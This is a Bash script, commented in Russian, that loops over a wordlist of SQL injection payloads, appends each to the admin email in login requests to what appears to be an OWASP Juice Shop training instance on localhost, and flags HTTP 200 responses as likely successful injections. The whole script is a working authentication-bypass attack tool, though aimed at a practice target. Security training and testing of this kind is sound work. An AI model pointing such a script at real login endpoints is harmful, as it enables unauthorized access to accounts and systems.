#!/usr/bin/env bash
set -euo pipefail

# Директория, в которой находится сам скрипт
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

TARGET="http://localhost:3000/rest/user/login"
BASE_USER="admin@juice-sh.op"

# Файл со списком SQL-инъекционных payload'ов
WORDLIST="$SCRIPT_DIR/wordlist_sqli.txt"

# Проверяем, что wordlist существует
if [ ! -f "$WORDLIST" ]; then
  echo "[!] Файл с SQL payload'ами не найден: $WORDLIST"
  exit 1
fi

echo "[*] Запуск тестирования SQL-инъекций против $TARGET"
echo "[*] Используется wordlist: $WORDLIST"
echo

while read -r PAYLOAD; do
  # Пропускаем пустые строки и строки-комментарии
  [[ -z "$PAYLOAD" || "$PAYLOAD" =~ ^# ]] && continue

  # Формируем email с SQL payload'ом
  EMAIL="${BASE_USER}${PAYLOAD}"

  echo "[*] Пробуем email payload: $EMAIL"

  HTTP_CODE=$(curl -s -X POST "$TARGET" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"$EMAIL\",\"password\":\"test\"}" \
    -o /dev/null -w "%{http_code}")

  echo "   HTTP код ответа: $HTTP_CODE"

  # Если получили 200 — возможный успешный SQL payload
  if [ "$HTTP_CODE" -eq 200 ]; then
    echo "[+] Возможный успешный SQL payload обнаружен"
    echo "    Payload: $PAYLOAD"
  fi

  # Небольшая задержка между запросами
  sleep 0.3
done < "$WORDLIST"

echo
echo "[+] Перебор SQL payload'ов завершён"
exit 0
